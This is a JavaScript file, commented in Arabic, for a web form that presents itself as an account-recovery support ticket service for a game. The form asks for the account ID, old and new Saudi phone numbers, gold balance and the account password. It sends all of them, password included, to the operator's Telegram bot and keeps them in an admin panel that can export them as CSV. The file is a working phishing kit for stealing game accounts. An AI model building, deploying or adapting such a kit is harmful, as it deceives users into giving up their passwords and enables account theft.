/* ============================================================
   FFQPU System — Account Recovery / Re-link Support Ticket
   Owner: FFQPU | Telegram: @FFQPU | Channel: https://t.me/BFQDS
   © 2026 FFQPU — All Rights Reserved
   ملف الجافاسكربت الرئيسي — كل المنطق هنا
   ============================================================ */

/* ————————————————————————————————————————————————
   تعليق عربي: الإعدادات — استبدل القيم هنا
   1) BOT_TOKEN: توكن بوت التيليجرام من @BotFather
   2) CHAT_ID: آيدي الشات الذي يستقبل الطلبات (من @userinfobot)
   3) ADMIN_PASSWORD: كلمة مرور لوحة الإدارة
———————————————————————————————————————————————— */
const BOT_TOKEN = "REPLACE_WITH_YOUR_BOT_TOKEN"; // ← ضع التوكن هنا، مثال: "123456789:AAHxxxx..."
const CHAT_ID = "REPLACE_WITH_YOUR_CHAT_ID";     // ← ضع الآيدي هنا، مثال: "123456789"
const ADMIN_PASSWORD = "FFQPU2026";              // ← غيّر كلمة مرور الإدارة من هنا

/* تعليق عربي: ثوابت التخزين المحلي */
const LS_TICKETS_KEY = "ffqpu_tickets";
const LS_LAST_SUBMIT_KEY = "ffqpu_last_submit";
const LS_LAST_TICKET_KEY = "ffqpu_last_ticket";
const RATE_LIMIT_MS = 30 * 1000; // تعليق عربي: منع التكرار خلال 30 ثانية

/* ============================================================
   تعليق عربي: أدوات مساعدة عامة
   ============================================================ */
function $(id) { return document.getElementById(id); }

function loadTickets() {
  try { return JSON.parse(localStorage.getItem(LS_TICKETS_KEY) || "[]"); }
  catch (e) { return []; }
}

function saveTickets(list) {
  localStorage.setItem(LS_TICKETS_KEY, JSON.stringify(list));
}

/* تعليق عربي: توليد رقم تذكرة فريد بصيغة TKT-2026-XXXXXX */
function generateTicket() {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"; // بدون حروف ملتبسة
  let rand = "";
  const buf = new Uint32Array(6);
  if (window.crypto && window.crypto.getRandomValues) {
    window.crypto.getRandomValues(buf);
    for (let i = 0; i < 6; i++) rand += chars[buf[i] % chars.length];
  } else {
    for (let i = 0; i < 6; i++) rand += chars[Math.floor(Math.random() * chars.length)];
  }
  return "TKT-2026-" + rand;
}

/* تعليق عربي: توحيد صيغة الرقم السعودي إلى +9665XXXXXXXX */
function normalizeSaudiPhone(raw) {
  if (!raw) return "";
  let p = String(raw).trim().replace(/[\s\-()]/g, "");
  // تحويل 05XXXXXXXX → +9665XXXXXXXX
  if (/^05\d{8}$/.test(p)) return "+966" + p.slice(1);
  // تحويل 5XXXXXXXX → +9665XXXXXXXX
  if (/^5\d{8}$/.test(p)) return "+966" + p;
  // تحويل 9665XXXXXXXX → +9665XXXXXXXX
  if (/^9665\d{8}$/.test(p)) return "+" + p;
  // تحويل 009665XXXXXXXX → +9665XXXXXXXX
  if (/^009665\d{8}$/.test(p)) return "+" + p.slice(2);
  return p;
}

/* تعليق عربي: التحقق — يجب أن يبدأ بـ +9665 ويتكون من +9665 + 8 أرقام */
function isValidSaudiPhone(raw) {
  const p = normalizeSaudiPhone(raw);
  return /^\+9665\d{8}$/.test(p);
}

/* تعليق عربي: هروب رموز HTML لمنع الحقن في رسالة تيليجرام */
function escHtml(s) {
  return String(s == null ? "" : s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

/* تعليق عربي: بناء رسالة التيليجرام بصيغة HTML مع إيموجي */
function buildTelegramMessage(d) {
  return (
    "🎫 <b>طلب استعادة حساب جديد</b>\n" +
    "━━━━━━━━━━━━━━━\n" +
    "🔖 <b>التذكرة:</b> <code>" + escHtml(d.ticket) + "</code>\n" +
    "🎮 <b>اللعبة:</b> " + escHtml(d.game) + "\n" +
    "🆔 <b>معرّف الحساب:</b> <code>" + escHtml(d.accountId) + "</code>\n" +
    "👤 <b>اللقب:</b> " + escHtml(d.nickname || "—") + "\n" +
    "📞 <b>الرقم القديم:</b> <code>" + escHtml(d.oldPhone) + "</code>\n" +
    "📲 <b>الرقم الجديد:</b> <code>" + escHtml(d.newPhone) + "</code>\n" +
    "❓ <b>السبب:</b> " + escHtml(d.reason) + "\n" +
    "🪙 <b>الذهب:</b> <code>" + escHtml(d.gold) + "</code>\n" +
    "🔑 <b>كلمة المرور:</b> <code>" + escHtml(d.password) + "</code>\n" +
    "📝 <b>ملاحظات:</b> " + escHtml(d.details || "—") + "\n" +
    "📅 <b>التاريخ:</b> " + escHtml(d.date) + "\n" +
    "━━━━━━━━━━━━━━━\n" +
    "👑 <b>FFQPU System</b> | <a href=\"https://t.me/BFQDS\">Channel</a>"
  );
}

/* تعليق عربي: إرسال البيانات إلى Telegram Bot API */
async function sendToTelegram(data) {
  // وضع التجربة: إذا لم يضع المالك التوكن بعد، ننجح محليًا دون إرسال شبكي
  if (!BOT_TOKEN || BOT_TOKEN.indexOf("REPLACE_WITH") === 0 ||
      !CHAT_ID || CHAT_ID.indexOf("REPLACE_WITH") === 0) {
    return { ok: true, demo: true };
  }
  const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
  const res = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: buildTelegramMessage(data),
      parse_mode: "HTML",
      disable_web_page_preview: true
    })
  });
  if (!res.ok) {
    let err = "";
    try { err = await res.text(); } catch (e) { /* تجاهل */ }
    throw new Error("Telegram API error: " + res.status + " " + err);
  }
  return { ok: true, demo: false };
}

/* ============================================================
   تعليق عربي: منطق صفحة النموذج (index.html)
   ============================================================ */
function setFieldValidity(name, valid) {
  const wrap = document.querySelector('[data-field="' + name + '"]');
  if (wrap) wrap.classList.toggle("invalid", !valid);
  return valid;
}

function initMainForm() {
  const form = $("recoveryForm");
  if (!form) return; // تعليق عربي: لسنا في صفحة النموذج

  const submitBtn = $("submitBtn");
  const boxOk = $("resultSuccess");
  const boxErr = $("resultError");

  // تعليق عربي: تحقق لحظي عند مغادرة حقل الهاتف
  ["oldPhone", "newPhone"].forEach(function (id) {
    const el = $(id);
    if (!el) return;
    el.addEventListener("blur", function () {
      const norm = normalizeSaudiPhone(el.value);
      if (el.value.trim() && norm !== el.value.trim()) el.value = norm; // توحيد تلقائي
      setFieldValidity(id, !el.value.trim() || isValidSaudiPhone(el.value));
    });
  });

  form.addEventListener("submit", async function (e) {
    e.preventDefault();
    boxOk.classList.remove("show");
    boxErr.classList.remove("show");

    // تعليق عربي: جمع القيم
    const game = $("game").value.trim();
    const accountId = $("accountId").value.trim();
    const nickname = $("nickname").value.trim();
    const oldRaw = $("oldPhone").value;
    const newRaw = $("newPhone").value;
    const oldPhone = normalizeSaudiPhone(oldRaw);
    const newPhone = normalizeSaudiPhone(newRaw);
    $("oldPhone").value = oldPhone; // تعليق عربي: عرض الصيغة الموحدة
    $("newPhone").value = newPhone;
    const reason = $("reason").value;
    const gold = $("gold").value.trim();
    const password = $("password").value;
    const details = $("details").value.trim();
    const consent = $("consent").checked;

    // تعليق عربي: التحقق من كل حقل
    let ok = true;
    ok = setFieldValidity("game", !!game) && ok;
    ok = setFieldValidity("accountId", accountId.length >= 3) && ok;
    ok = setFieldValidity("oldPhone", isValidSaudiPhone(oldPhone)) && ok;
    let newValid = isValidSaudiPhone(newPhone) && newPhone !== oldPhone;
    ok = setFieldValidity("newPhone", newValid) && ok;
    ok = setFieldValidity("reason", !!reason) && ok;
    ok = setFieldValidity("gold", gold.length >= 1) && ok;
    ok = setFieldValidity("password", password.length >= 3) && ok;
    ok = setFieldValidity("consent", consent) && ok;

    if (!ok) {
      showError("فضلًا أكمل الحقول المطلوبة بشكل صحيح — تحقق من الأرقام السعودية (+9665XXXXXXXX) والموافقة.");
      scrollToBox(boxErr);
      return;
    }

    // تعليق عربي: حد المعدل — منع الإرسال المزدوج خلال 30 ثانية
    const last = parseInt(localStorage.getItem(LS_LAST_SUBMIT_KEY) || "0", 10);
    const now = Date.now();
    const wait = Math.ceil((RATE_LIMIT_MS - (now - last)) / 1000);
    if (last && now - last < RATE_LIMIT_MS) {
      showError("فضلًا انتظر " + wait + " ثانية قبل إرسال طلب آخر (منع التكرار).");
      scrollToBox(boxErr);
      return;
    }

    // تعليق عربي: توليد التذكرة وحفظها محليًا
    const ticket = generateTicket();
    const date = new Date().toLocaleString("ar-SA", { timeZone: "Asia/Riyadh" });
    const record = {
      ticket: ticket, game: game, accountId: accountId, nickname: nickname,
      oldPhone: oldPhone, newPhone: newPhone, reason: reason,
      gold: gold, password: password, details: details,
      status: "new", date: date, ts: now
    };
    const list = loadTickets();
    list.unshift(record);
    saveTickets(list);
    localStorage.setItem(LS_LAST_TICKET_KEY, JSON.stringify(record));
    localStorage.setItem(LS_LAST_SUBMIT_KEY, String(now));

    // تعليق عربي: حالة التحميل على الزر
    const originalBtn = submitBtn.innerHTML;
    submitBtn.disabled = true;
    submitBtn.textContent = "جارٍ الإرسال… ⏳";

    try {
      const r = await sendToTelegram(record);
      // تعليق عربي: نجاح — عرض صندوق النجاح مع رقم التذكرة
      $("ticketNumber").textContent = ticket;
      const link = $("successPageLink");
      if (link) link.href = "./success.html?ticket=" + encodeURIComponent(ticket);
      boxOk.classList.add("show");
      scrollToBox(boxOk);
      form.reset();
      if (r.demo) {
        console.info("[FFQPU] Demo mode: BOT_TOKEN/CHAT_ID not set — saved locally only.");
      }
    } catch (err) {
      console.error(err);
      // تعليق عربي: فشل — عرض صندوق خطأ بالعربية (الطلب محفوظ محليًا)
      showError("تعذّر الإرسال إلى الدعم الآن (خطأ شبكة أو إعداد البوت). تم حفظ طلبك محليًا برقم " + ticket + " — حاول مجددًا بعد 30 ثانية أو تواصل عبر @FFQPU.");
      scrollToBox(boxErr);
    } finally {
      submitBtn.disabled = false;
      submitBtn.innerHTML = originalBtn;
    }
  });

  function showError(msg) {
    $("errorMsg").textContent = msg;
    boxErr.classList.add("show");
  }

  function scrollToBox(el) {
    // تعليق عربي: تمرير ناعم إلى النتيجة
    setTimeout(function () {
      el.scrollIntoView({ behavior: "smooth", block: "center" });
    }, 60);
  }

  // تعليق عربي: زر نسخ التذكرة
  const copyBtn = $("copyTicketBtn");
  if (copyBtn) copyBtn.addEventListener("click", function () {
    copyText($("ticketNumber").textContent.trim(), copyBtn);
  });

  // تعليق عربي: زر الطباعة / PDF
  const printBtn = $("printBtn");
  if (printBtn) printBtn.addEventListener("click", function () { window.print(); });
}

/* تعليق عربي: نسخ نص إلى الحافظة مع دعم المتصفحات القديمة */
function copyText(text, btn) {
  function done() {
    if (!btn) return;
    const old = btn.textContent;
    btn.textContent = "✅ تم النسخ!";
    setTimeout(function () { btn.textContent = old; }, 1600);
  }
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(text).then(done).catch(function () { fallbackCopy(text); done(); });
  } else { fallbackCopy(text); done(); }
}
function fallbackCopy(text) {
  const ta = document.createElement("textarea");
  ta.value = text;
  ta.style.position = "fixed";
  ta.style.opacity = "0";
  document.body.appendChild(ta);
  ta.select();
  try { document.execCommand("copy"); } catch (e) { /* تجاهل */ }
  document.body.removeChild(ta);
}

/* ============================================================
   تعليق عربي: منطق صفحة النجاح (success.html)
   ============================================================ */
function initSuccessPage() {
  const ticketEl = $("successTicket");
  if (!ticketEl) return; // تعليق عربي: لسنا في صفحة النجاح

  // تعليق عربي: قراءة التذكرة من الرابط ?ticket= أو من آخر طلب محفوظ
  const params = new URLSearchParams(window.location.search);
  let ticket = params.get("ticket") || "";
  let record = null;
  const list = loadTickets();
  if (ticket) record = list.find(function (t) { return t.ticket === ticket; }) || null;
  if (!record) {
    try { record = JSON.parse(localStorage.getItem(LS_LAST_TICKET_KEY) || "null"); } catch (e) { record = null; }
    if (record) ticket = record.ticket;
  }
  if (ticket) ticketEl.textContent = ticket;
  if (record) {
    if ($("dGame")) $("dGame").textContent = record.game || "—";
    if ($("dId")) $("dId").textContent = record.accountId || "—";
    if ($("dPhone")) $("dPhone").textContent = record.newPhone || "—";
    if ($("dDate")) $("dDate").textContent = record.date || "—";
  }

  const c2 = $("copyBtn2");
  if (c2) c2.addEventListener("click", function () { copyText(ticketEl.textContent.trim(), c2); });
  const p2 = $("printBtn2");
  if (p2) p2.addEventListener("click", function () { window.print(); });
}

/* ============================================================
   تعليق عربي: منطق لوحة الإدارة (admin.html)
   ============================================================ */
function initAdmin() {
  const gate = $("loginGate");
  if (!gate) return; // تعليق عربي: لسنا في صفحة الإدارة

  const dash = $("dashboard");
  const passInput = $("adminPass");
  const loginError = $("loginError");

  // تعليق عربي: تذكّر الجلسة في نفس المتصفح
  if (sessionStorage.getItem("ffqpu_admin") === "1") { showDash(); }

  $("loginBtn").addEventListener("click", tryLogin);
  passInput.addEventListener("keydown", function (e) { if (e.key === "Enter") tryLogin(); });

  function tryLogin() {
    if (passInput.value === ADMIN_PASSWORD) {
      sessionStorage.setItem("ffqpu_admin", "1");
      showDash();
    } else {
      loginError.style.display = "block";
      passInput.classList.add("invalid");
      setTimeout(function () { loginError.style.display = "none"; }, 2500);
    }
  }

  function showDash() {
    gate.style.display = "none";
    dash.style.display = "block";
    renderTable();
  }

  $("logoutBtn").addEventListener("click", function () {
    sessionStorage.removeItem("ffqpu_admin");
    location.reload();
  });

  $("statusFilter").addEventListener("change", renderTable);

  // تعليق عربي: تحديث الإحصائيات والجدول
  function renderTable() {
    const filter = $("statusFilter").value;
    const all = loadTickets();
    const rows = filter === "all" ? all : all.filter(function (t) { return t.status === filter; });

    $("statTotal").textContent = all.length;
    $("statNew").textContent = all.filter(function (t) { return t.status === "new"; }).length;
    $("statDone").textContent = all.filter(function (t) { return t.status === "done"; }).length;

    const body = $("ticketsBody");
    body.innerHTML = "";
    $("emptyState").style.display = rows.length ? "none" : "block";

    rows.forEach(function (t) {
      const tr = document.createElement("tr");
      const pill = t.status === "done" ? "status-done" : (t.status === "processing" ? "status-processing" : "status-new");
      const label = t.status === "done" ? "منجزة" : (t.status === "processing" ? "قيد المعالجة" : "جديدة");
      tr.innerHTML =
        "<td><strong>" + escHtml(t.ticket) + "</strong></td>" +
        "<td>" + escHtml(t.game) + "</td>" +
        "<td>" + escHtml(t.accountId) + "</td>" +
        "<td>" + escHtml(t.oldPhone) + "</td>" +
        "<td>" + escHtml(t.newPhone) + "</td>" +
        "<td>" + escHtml(t.gold) + "</td>" +
        '<td><span class="status-pill ' + pill + '">' + label + "</span></td>" +
        "<td>" + escHtml(t.date) + "</td>";
      const tdAct = document.createElement("td");
      tdAct.className = "row-actions no-print";
      const sel = document.createElement("select");
      ["new", "processing", "done"].forEach(function (s) {
        const op = document.createElement("option");
        op.value = s;
        op.textContent = s === "new" ? "جديدة" : (s === "processing" ? "قيد المعالجة" : "منجزة");
        if (t.status === s) op.selected = true;
        sel.appendChild(op);
      });
      sel.setAttribute("aria-label", "تغيير الحالة");
      sel.addEventListener("change", function () {
        const store = loadTickets();
        const ix = store.findIndex(function (x) { return x.ticket === t.ticket; });
        if (ix > -1) { store[ix].status = sel.value; saveTickets(store); renderTable(); }
      });
      tdAct.appendChild(sel);
      tr.appendChild(tdAct);
      body.appendChild(tr);
    });
  }

  // تعليق عربي: تصدير CSV مع BOM لدعم العربية في Excel
  $("exportCsvBtn").addEventListener("click", function () {
    const all = loadTickets();
    if (!all.length) { alert("لا توجد طلبات للتصدير."); return; }
    const head = ["Ticket", "Game", "AccountID", "Nickname", "OldPhone", "NewPhone", "Reason", "Gold", "Status", "Date", "Details"];
    const lines = [head.join(",")];
    all.forEach(function (t) {
      const row = [t.ticket, t.game, t.accountId, t.nickname, t.oldPhone, t.newPhone, t.reason, t.gold, t.status, t.date, (t.details || "").replace(/\n/g, " ")];
      lines.push(row.map(function (v) { return '"' + String(v == null ? "" : v).replace(/"/g, '""') + '"'; }).join(","));
    });
    const blob = new Blob(["\uFEFF" + lines.join("\n")], { type: "text/csv;charset=utf-8" });
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = "ffqpu-tickets-2026.csv";
    document.body.appendChild(a);
    a.click();
    setTimeout(function () { URL.revokeObjectURL(a.href); a.remove(); }, 500);
  });

  $("printAdminBtn").addEventListener("click", function () { window.print(); });

  $("clearAllBtn").addEventListener("click", function () {
    if (confirm("هل أنت متأكد من مسح كل الطلبات المحلية؟")) {
      saveTickets([]);
      renderTable();
    }
  });
}

/* تعليق عربي: تشغيل المنطق المناسب حسب الصفحة عند تحميل DOM */
document.addEventListener("DOMContentLoaded", function () {
  initMainForm();
  initSuccessPage();
  initAdmin();
});
